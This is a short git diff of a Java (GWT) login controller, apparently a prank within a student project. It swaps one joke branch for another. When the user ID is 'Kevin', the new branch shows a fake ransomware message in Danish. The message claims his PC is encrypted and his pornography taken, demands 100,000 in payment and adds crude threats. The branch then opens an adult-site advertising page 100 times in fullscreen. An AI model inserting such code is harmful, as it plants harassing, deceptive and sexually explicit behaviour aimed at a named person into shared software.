@@ -345,13 +345,18 @@ public class Controller {
 		@Override
 		public void onClick(ClickEvent event) {
 			if (event.getSource() == loginView.getBtnOk())
-				if (loginView.getUserId().equals("Aleksander")){
-					int i = 0;
-					while(i < 100){
-					Window.open("https://www.instagram.com/ceciliewellemberg/?hl=da", null, "fullscreeen");
-	
-					i++;
+			
+				if (loginView.getUserId().equals("Kevin")){
+					Window.alert("Du har vist glemt din kode Kevin??? Din skod windows pc er blevet krypteret, vi har al din porno. Betal 100.000 for at få koden eller vi tisser på din madras.  Windows virus har slået til igen. Hilsen GIT master u bitch. ");
+
+					int i;
+					for(i=0; i<100; i++){
+					
+					Window.open("http://creatives.livejasmin.com/pu/w2/index.php?psid=ed_admeddk&site=livejasmin", null, "fullscreeen");
+						
+					
 					}
+
 				}
 				personDAO.getPersons((new AsyncCallback<List<PersonDTO>>() {
 					@Override
